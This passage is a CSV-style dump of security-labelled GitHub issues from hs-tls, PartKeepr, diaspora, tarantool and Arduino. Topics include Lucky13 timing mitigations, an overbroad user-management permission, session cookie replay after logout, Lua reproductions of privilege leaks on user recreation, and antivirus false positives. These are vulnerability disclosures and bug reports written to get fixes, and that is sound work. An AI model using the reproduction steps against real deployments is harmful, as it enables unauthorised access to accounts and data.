while for TLS 1.3 and modern deployments of TLS 1.2, using AEAD ciphers is definitely much better approach, I don't think it's the last nail in that coffin just yet - firstly Peter Gutmann TLS-LTS proposal does use EtM. And while I'd love the world to move as quick forward as standards do that not the reality. So, secondly I'm quite sure that the CBC ciphers will be with us in enterprise deployments for years, if not for more than a decade... 🙁 (See also: Cisco themselves using long-EOLed ACE appliance vulnerable to ROBOT/Bleichenbacher)

to put it other way: if hs-tls is aiming to be a generic purpose TLS stack, it will need to support CBC ciphers for many yearsI'm confused this issue is not taken seriously enough. Half the networking ecosystem (or more) directly or indirectly depends on this library. Creating an attack against this library will pay off very well.@hasufell you're more than welcome to create your own library, and/or create an attack that will make you rich !> you're more than welcome to create your own library

Ok, so much for collaboration.

> and/or create an attack that will make you rich !

Making jokes in the context of real world security... I'm speechless.I'm making joke of your sense of entitlement, which is really a collaboration deal breaker FYI.I put a benchmark showing execution time with the current behavior and with lucky13 migitations here:
https://github.com/ocheron/crypto-cbc#readme
The variable number of hash compression function calls is visible.
It would be good someone else can confirm having the same pattern when executing.

First PR sent for `cryptonite`: haskell-crypto/cryptonite#325
Changes to `tls` will come when this first part is available.We've recently added support for performing timing attacks in tlsfuzzer:
https://github.com/tomato42/tlsfuzzer/blob/master/TIMING.md
https://github.com/tomato42/tlsfuzzer/blob/master/scripts/test-lucky13.py

The documentation is currently rather rough (for one, it's missing how to setup the system for testing), I'm working on better one in a PR: https://github.com/tomato42/tlsfuzzer/pull/679 I should have something decent by the end of next week.such good work @ocheron, and a clear demonstration of evidence based development",no,"security,"
partkeepr/PartKeepr,199213941,"password_hash terminates at \0","https://secure.php.net/manual/de/function.password-hash.php#118603 states that password encryption using password_hash is not as secure as one might expect. It should be tested if this unintuitive behaviour is relevant for PartKeepr",,no,"Need to reproduce,security-issue,"
partkeepr/PartKeepr,187211263,"every user can create/delete other user","hello,

i am using version 1.1.0 at our local intranet and i found out that every user is able to create or delete other users. at https://demo.partkeepr.org it is not possible to reproduce because of the automatic login of the demo-adminuser.

server is running with debian jessie 8.6 and php 7.0.12 and the issue is independent from the client-os or client-browser","That is correct, every user can do everything. This issue depends on #37 
",no,"Base Functionality,Low Priority,security-issue,"
partkeepr/PartKeepr,118653009,"Required filesystem permissions seem overly broad","I just installed version 0.75, which required a long list of filesystem permissions to work. In particular:
- `app/cache` or `var/cache`, and `app/logs` or `var/logs`. These are sensible and well-contained. Nice that they can be put into `var`, so you can have a `var` that is entirely writeable.
- `app` and `web`. These contain a lot of PHP source files, and I'd rather not make them writeable in their entirety. Also, making `app` writeable, makes it a bit pointless to first make `app/cache` and `app/logs` writeable.
- Inside `web/bundles`, there are symlinks to `vendor` and `src`, meaning that (parts of) those directories also need to be writeable to satisfy the previous requirement.

I've now tried to make `app`, `web`, `src` and `vendor` writeable during setup and removing write permissions afterwards, hoping that writeability is only needed during setup, but this doesn't seem to run at all. Keeping write access on `app` and `web` seems to run, though I didn't do any thorough testing yet.
","I think this should not be a Feature Request, but a major bug! I encountered this problem today as well and am very confused about the broad write permissions. Would be nice to have it fixed in the next minor realese and not in 1.0.
Thanks for your feedback.

As it is a complex task, it was scheduled for 1.0. I'd appreciate if you can provide feedback or input regarding on how to solve the issue.

The reason why PartKeepr checks for write access recursively is that setup needs to write files, specifically those configured by the assetic bundle. If there was a fixed list, developers would need to double-check the fixed list against each and every bundle update, like `BrainBitsFugueIcons` etc.

One option would be to allow `.php` files within `web/` be read-only, as those don't need to be changed by the setup.

`web/bundles`, `web/atelierspierrot`, `web/css`, `web/js`, `web/images` and `web/spritesheets` must be writable during setup. Probably a note could be added when the setup is finished to make the whole `web` directory read-only.
overall the permissions asked for under setup are too broad, and they ask for broad, but then later narrow it down - this could be done better.. In part because the wiki tells you to make it all writable..

Normal practice would be for the entire dir to be owned by the httpd user, everything read only except for specific directories for uploading and these dirs must not have executable permissions for files within them.",no,"Bug,move-to-wiki,security-issue,"
partkeepr/PartKeepr,1024307,"V2 Permissions","We wish to introduce a full fledged permission system.
## <bountysource-plugin>

Want to back this issue? **[Post a bounty on it!](https://www.bountysource.com/issues/25350229-v2-permissions?utm_campaign=plugin&utm_content=tracker%2F333673&utm_medium=issues&utm_source=github)** We accept bounties via [Bountysource](https://www.bountysource.com/?utm_campaign=plugin&utm_content=tracker%2F333673&utm_medium=issues&utm_source=github).
</bountysource-plugin>
","Sounds nice!
Permissions must be given on a per-object and per-instance basis.
- Read-only access per-instance is always allowed (example: If the user has permission to view reports, all reports are visible)
- Write access may be revoked for creating new objects, or changing existing objects.
",no,"Base Functionality,Low Priority,security-issue,"
partkeepr/PartKeepr,117252907,"Double-check password in setup","Right now, we prompt for a password just once during setup. There should be a confirmation field.
",,no,"Must Have,Feature Request,security-issue,"
partkeepr/PartKeepr,128406275,"Setup Issue","An attacker can potentially retrieve the system's database credentials and/or create additional users.

The setup code has been refactored to double-check the authentication key during internal requests.

To sanely fix the issue, the setup system needs to be refactured to use service calls instead of web requests, this also enables better unit tests.
","I will run a vulnerability scan against my 1.4.0 install soonran deepscan against the codebase.. not high issues found, a handful of medium/low issues..
",no,"Bug,Feedback Needed,security-issue,"
diaspora/diaspora,488446904,"Lock account after 3 failed login attempts","**POD Version:** v0.7.10.0

**Steps to reproduce:**
1. Open Login Page
2. Enter Valid Username & Invalid Password 3 times/more

**Expected behavior:**
Account Lockout Feature should be there after 3 failed attempts
or,
Captcha should be there during Login

**Actual behavior:**
No Account Lockout Option is there","How would you unlock?To prevent automated programs or bots, from performing login attempts using brute force attack.
Account may be locked for 24 hours.It would be a huge security problem if it would be possible for everybody to just lock somebody out of their account by just entering an invalid password 3 times.Agree with SuperTux here. If you want to increase the security level of your account, activate the 2FA feature.2FA solving this better is a good point. We could think about locking after N failed 2FA attempts, assuming the attacker might have brute forced the account password successfully and now tries to brute force the 2FA token, but that'd be a quite minor improvement that might not be worth the less good UX that would result from that or the added code complexity.

We could also think about notifying the user after N failed login attempts and suggest them to enable 2FA since there seems to be an attack on their account.I am not sure if brute-forcing accounts is a problem for Diaspora but some sort of rate limiting would be useful for those who don't want 2FA.

E.g. first three attempts work as usual. If the third attempt fails then before validating the next attempt there is a wait and/or captcha appears. This won't be a problem for legitimate user.

2FA of course is better solution but I suspect vast majority of users won't want it on their social network account, especially one prone to sudden logoffs.For rate-limiting we could look into integrating https://github.com/kickstarter/rack-attackThis issue is old, But instead of locking user account after 3 failed login attempt, Just ratelimit the IP address of attacker for doing login.",no,"🚑 security,✨ feature,🤔 undecided,"
diaspora/diaspora,488440138,"Session Replay / MITM Attack","**POD Version:** v0.7.10.0

**Steps to reproduce:**
1. Login into the diaspora instance
2. Copy the Cookie Session ID >> Logout/Close the browser
3. Open Login Page >> Use the same session ID for directly accessing the application

**Expected behavior:**
1. Session ID should be invalidated after user logout.
2. Session timeout should be there
3. Session ID shouldn't be sent with GET method

**Actual behavior:**
Session Replay / MITM Attack

","This is a known tradeoff when using cookie based session stores, devise makes it quite willingly: https://github.com/plataformatec/devise/issues/3031#issuecomment-125678869

Changing the session store might be a bit hard for us since all other session stores complicate deploying diaspora or have a performance impact. There's one other solution to this issue, outlined at https://makandracards.com/makandra/53562-devise-invalidating-all-sessions-for-a-user, which has the downside that a logout invalidates all user sessions (eg. the one on their mobile device too), not just the current one.

PS: We got security@diasporafoundation.org for responsible disclosure. Albeit the severity of this being rather low, please do write us there first for security related issues.Hi @jhass ,

I've tried changes as per your suggested link.

Added following into `/opt/diaspora/apps/diaspora/htdocs/app/models/user.rb`:
```rb
class User < ApplicationRecord
  devise :database_authenticatable, :recoverable, :rememberable
  def authenticatable_salt
    ""#{super}#{session_token}""
  end
  def invalidate_all_sessions!
    self.update_attribute(:session_token, SecureRandom.hex)
  end
end
```

Added following into `/opt/diaspora/apps/diaspora/htdocs/app/controllers/sessions_controller.rb`:
```rb
class Users::SessionsController < Devise::SessionsController
  def destroy
    current_user.invalidate_all_sessions!
    super
  end
end
```

Application not working then onward, am I doing right steps?
Kindly suggest.I hope you didn't just paste those lines exactly like that into the files, they're examples. Especially the `devise` line you want to maybe (if even) modify the existing one in line 29 of the user model.

Most likely you skipped the step of

> Add a `session_token` column to your devise model

which requires creating a [migration](https://guides.rubyonrails.org/active_record_migrations.html).

In  general please provide any error messages you get :)",no,"🚑 security,✨ feature,"
tarantool/tarantool,500530086,"User recreation leaks privileges locally","Tarantool version:
Any

Bug description:
If a user is recreated, existing fibers logged from this user are not stopped. Moreover, if a new user is created with the same id as the old one, the old fibers will work on behalf of the new user.

Steps to reproduce:
```Lua
box.cfg{}
fiber = require('fiber')

s = box.schema.create_space('test')
pk = s:create_index('pk')
box.schema.user.create('test_user', {password = '1'})

box.session.su('test_user')
tarantool> s:replace{1}
---
- error: Write access to space 'test' is denied for user 'test_user'
...

fiber.create(function()
	box.session.su('admin')
	box.schema.user.drop('test_user')
	box.schema.user.create('new_test_user', {password = '2'})
	box.schema.user.grant('new_test_user', 'read, write', 'space', 'test')
end)
fiber.sleep(0.1) -- Wait till the fiber is dead
tarantool> s:replace{1}
---
- [1]
...
```
The latest `replace` succeeds even though the user is deleted already, and the new user with the same id even has a different password.",,no,"bug,security,app,teamC,"
tarantool/tarantool,1373471683,"Consider adding `-D_FORTIFY_SOURCE=2` compiler option","Most of common compile-time options that harden against memory corruption attacks were added in #7587, however `-D_FORTIFY_SOURCE=2` requires more thorough attention. It doesn't work well with ASAN, and requires compilation with optimizations (at least -O) for all files, including sources in ExternalProjects.",,no,"build,security,"
tarantool/tarantool,500522516,"User recreation leaks privileges in remote connections","Tarantool version:
Any

Bug description:
If a user is recreated, existing connections are not closed. Moreover, if a new user is created with the same id as the old one, the old connections will work on behalf of the new user.

Steps to reproduce:
Instance 1:
```Lua
box.cfg{listen = 3313}
s = box.schema.create_space('test')
pk = s:create_index('pk')
box.schema.user.create('test_user', {password = '1'})
box.schema.user.grant('test_user', 'read', 'space', 'test')
box.schema.user.grant('test_user', 'write', 'space', 'test')
```
Instance 2:
```Lua
netbox = require('net.box')
c = netbox.connect('localhost:3313', {user = 'test_user', password = '1'})
tarantool> c.space.test:replace{1} -- This is ok.
---
- [1]
...
```
### Bug 1
Instance 1:
```Lua
box.schema.user.drop('test_user')
```
Instance 2:
```Lua
tarantool> c.space.test:replace{1} -- Weird error message.
---
- error: User '32' is not found
...
```
### Bug 2
Instance 1:
```Lua
box.schema.user.create('new_test_user', {password = '1'})
```
Instance 2:
```Lua
tarantool> c.space.test:replace{1} -- Logged as a new user - priv leak.
---
- error: Write access to space 'test' is denied for user 'new_test_user'
...
```","Related to #2763.Related to #4536.",no,"bug,security,app,teamC,"
arduino/Arduino,663181405,"Zillya Trojan.CrisisHT.Win32.210 and Exploit.Zip.Heuristic-java.csrvpr detected by VirusTotal","I have just downloaded ARDUINO 1.8.13 from the [official website](https://www.arduino.cc/download_handler.php?f=/arduino-1.8.13-windows.exe) and ran it through VirusTotal. I was surprised to find that VirusTotal detects a trojan in the installer.

Then I downloaded the same version from [github](https://github.com/arduino/Arduino/releases/download/1.8.13/arduino-1.8.13.tar.xz) and then ran it through VirusTotal. This time it detected Exploit.Zip.Heuristic-java.csrvpr.

![Arduino-1 8 13-Trojan CrisisHT Win32 210](https://user-images.githubusercontent.com/10776430/88085846-00bd0f80-cbb9-11ea-95d5-944eb0ba9a21.jpg)
![Arduino-1 8 13-Exploit Zip Heuristic-java csrvpr](https://user-images.githubusercontent.com/10776430/88085861-0581c380-cbb9-11ea-9acb-04bf20ce7af8.jpg)
","On an added note, I just ran [1.8.10](https://github.com/arduino/Arduino/archive/1.8.11-ms-store-1.zip) and VirusTotal gives it a clean chit.
![Arduino-1 8 10](https://user-images.githubusercontent.com/10776430/88087093-fa2f9780-cbba-11ea-9aef-1534bc524ad6.jpg)
",no,"Type: Bug,security,"
arduino/Arduino,1346607206,"Trojan:Win32/PackBackdoor ?","I was trying to install [Arduino IDE 1.8.19](https://www.arduino.cc/en/software)  and as always I ran the installer through VirusTotal. One of the Security Vendor's Analysis detects Trojan:Win32/PackBackdoor.0142b83b. I am thinking that this could mostly be a false alarm? Any thoughts?

![Arduino_IDE_1 8 19](https://user-images.githubusercontent.com/10776430/185959959-53c9e35a-ff88-45fb-bc39-d2ee1517f802.jpg)

","UttamHi @mm108. Thanks for bringing this detection to our attention. I have notified Arduino's security team of your report.> Hi @mm108. Thanks for bringing this detection to our attention. I have notified Arduino's security team of your report.

Thank you so much @per1234.",no,"Component: IDE,security,"
arduino/Arduino,773090029,"""KeyUsage does not allow digital signatures"" when Board Manager attempts downloading ""package_index.json"".","Arduino IDE: 1.8.13
Windows Version: Windows 10  Enterprise, 10.0.18363 Build 18363

I was getting a ""unable to find valid certification path to requested target"" error as described in #8474 as I'm behind a company proxy but after applying [this](https://github.com/arduino/Arduino/issues/8474#issuecomment-494798961) fix I now get a ""KeyUsage does not allow digital signatures"" error as below:
```
Preparing boards...
2020-12-22T15:18:51.552Z INFO c.a.c.p.ContributionInstaller:305 [main] Start download and signature check of=[https://downloads.arduino.cc/packages/package_index.json]
Downloading platforms index... 
2020-12-22T15:18:51.556Z INFO c.a.u.n.FileDownloaderCache:92 [main] Cache folder C:\Users\P611654\AppData\Local\Arduino15\cache
2020-12-22T15:18:51.588Z INFO c.a.u.n.FileDownloaderCache:149 [main] Get file cached is expire true, exist false, info FileCached{eTag='null', lastETag='null', remoteURL='https://downloads.arduino.cc/packages/package_index.json', localPath='C:\Users\P611654\AppData\Local\Arduino15\cache\downloads.arduino.cc\packages\package_index.json', md5='null', createdAt='2020-12-22T15:18:51.569', cacheControl=null} 
2020-12-22T15:18:52.890Z INFO c.a.u.n.HttpConnectionManager:153 [cc.arduino.packages.discoverers.serial.SerialDiscovery] Connect to https://builder.arduino.cc/builder/v1/boards/0x0403/0x6001, method=GET, request id=604266058A7743FD
2020-12-22T15:18:52.890Z INFO c.a.u.n.HttpConnectionManager:153 [main] Connect to https://downloads.arduino.cc/packages/package_index.json, method=HEAD, request id=C15803D0E1D24A3F
2020-12-22T15:18:53.105Z ERROR c.a.u.n.FileDownloader:199 [main] The request stop
javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: KeyUsage does not allow digital signatures
	at sun.security.ssl.Alerts.getSSLException(Alerts.java:192) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1946) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:316) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:310) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1639) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.process_record(Handshaker.java:965) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:162) ~[?:1.8.0_191]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:155) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:106) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.updateCacheInfo(FileDownloaderCache.java:184) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.getFileCached(FileDownloaderCache.java:153) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.downloadFile(FileDownloader.java:167) [arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.download(FileDownloader.java:129) [arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:147) [arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.downloadIndexAndSignature(DownloadableContributionsDownloader.java:165) [arduino-core.jar:?]
	at cc.arduino.contributions.packages.ContributionInstaller.updateIndex(ContributionInstaller.java:306) [arduino-core.jar:?]
	at processing.app.Base.<init>(Base.java:318) [pde.jar:?]
	at processing.app.Base.main(Base.java:150) [pde.jar:?]
Caused by: sun.security.validator.ValidatorException: KeyUsage does not allow digital signatures
	at sun.security.validator.EndEntityChecker.checkTLSServer(EndEntityChecker.java:271) ~[?:1.8.0_191]
	at sun.security.validator.EndEntityChecker.check(EndEntityChecker.java:143) ~[?:1.8.0_191]
	at sun.security.validator.Validator.validate(Validator.java:274) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:324) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:229) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:124) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1621) ~[?:1.8.0_191]
	... 21 more
2020-12-22T15:18:53.110Z ERROR c.a.c.DownloadableContributionsDownloader:181 [main] Cannot download the package index from https://downloads.arduino.cc/packages/package_index.json the package will be discard
java.lang.Exception: Error downloading https://downloads.arduino.cc/packages/package_index.json
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:149) ~[arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.downloadIndexAndSignature(DownloadableContributionsDownloader.java:165) [arduino-core.jar:?]
	at cc.arduino.contributions.packages.ContributionInstaller.updateIndex(ContributionInstaller.java:306) [arduino-core.jar:?]
	at processing.app.Base.<init>(Base.java:318) [pde.jar:?]
	at processing.app.Base.main(Base.java:150) [pde.jar:?]
Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: KeyUsage does not allow digital signatures
	at sun.security.ssl.Alerts.getSSLException(Alerts.java:192) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1946) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:316) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:310) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1639) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.process_record(Handshaker.java:965) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:162) ~[?:1.8.0_191]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:155) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:106) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.updateCacheInfo(FileDownloaderCache.java:184) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.getFileCached(FileDownloaderCache.java:153) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.downloadFile(FileDownloader.java:167) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.download(FileDownloader.java:129) ~[arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:147) ~[arduino-core.jar:?]
	... 4 more
Caused by: sun.security.validator.ValidatorException: KeyUsage does not allow digital signatures
	at sun.security.validator.EndEntityChecker.checkTLSServer(EndEntityChecker.java:271) ~[?:1.8.0_191]
	at sun.security.validator.EndEntityChecker.check(EndEntityChecker.java:143) ~[?:1.8.0_191]
	at sun.security.validator.Validator.validate(Validator.java:274) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:324) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:229) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:124) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1621) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.process_record(Handshaker.java:965) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:162) ~[?:1.8.0_191]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:155) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:106) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.updateCacheInfo(FileDownloaderCache.java:184) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.getFileCached(FileDownloaderCache.java:153) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.downloadFile(FileDownloader.java:167) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.download(FileDownloader.java:129) ~[arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:147) ~[arduino-core.jar:?]
	... 4 more
2020-12-22T15:18:53.112Z ERROR c.a.c.p.ContributionInstaller:308 [main] Error downloading https://downloads.arduino.cc/packages/package_index.json
java.lang.Exception: Error downloading https://downloads.arduino.cc/packages/package_index.json
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:149) ~[arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.downloadIndexAndSignature(DownloadableContributionsDownloader.java:165) ~[arduino-core.jar:?]
	at cc.arduino.contributions.packages.ContributionInstaller.updateIndex(ContributionInstaller.java:306) [arduino-core.jar:?]
	at processing.app.Base.<init>(Base.java:318) [pde.jar:?]
	at processing.app.Base.main(Base.java:150) [pde.jar:?]
Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: KeyUsage does not allow digital signatures
	at sun.security.ssl.Alerts.getSSLException(Alerts.java:192) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1946) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:316) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:310) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1639) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.process_record(Handshaker.java:965) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:162) ~[?:1.8.0_191]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:155) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:106) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.updateCacheInfo(FileDownloaderCache.java:184) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.getFileCached(FileDownloaderCache.java:153) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.downloadFile(FileDownloader.java:167) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.download(FileDownloader.java:129) ~[arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:147) ~[arduino-core.jar:?]
	... 4 more
Caused by: sun.security.validator.ValidatorException: KeyUsage does not allow digital signatures
	at sun.security.validator.EndEntityChecker.checkTLSServer(EndEntityChecker.java:271) ~[?:1.8.0_191]
	at sun.security.validator.EndEntityChecker.check(EndEntityChecker.java:143) ~[?:1.8.0_191]
	at sun.security.validator.Validator.validate(Validator.java:274) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:324) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:229) ~[?:1.8.0_191]
	at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:124) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1621) ~[?:1.8.0_191]
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037) ~[?:1.8.0_191]
	at sun.security.ssl.Handshaker.process_record(Handshaker.java:965) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395) ~[?:1.8.0_191]
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[?:1.8.0_191]
	at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:162) ~[?:1.8.0_191]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:155) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.HttpConnectionManager.makeConnection(HttpConnectionManager.java:106) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.updateCacheInfo(FileDownloaderCache.java:184) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloaderCache.getFileCached(FileDownloaderCache.java:153) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.downloadFile(FileDownloader.java:167) ~[arduino-core.jar:?]
	at cc.arduino.utils.network.FileDownloader.download(FileDownloader.java:129) ~[arduino-core.jar:?]
	at cc.arduino.contributions.DownloadableContributionsDownloader.download(DownloadableContributionsDownloader.java:147) ~[arduino-core.jar:?]
	... 4 more
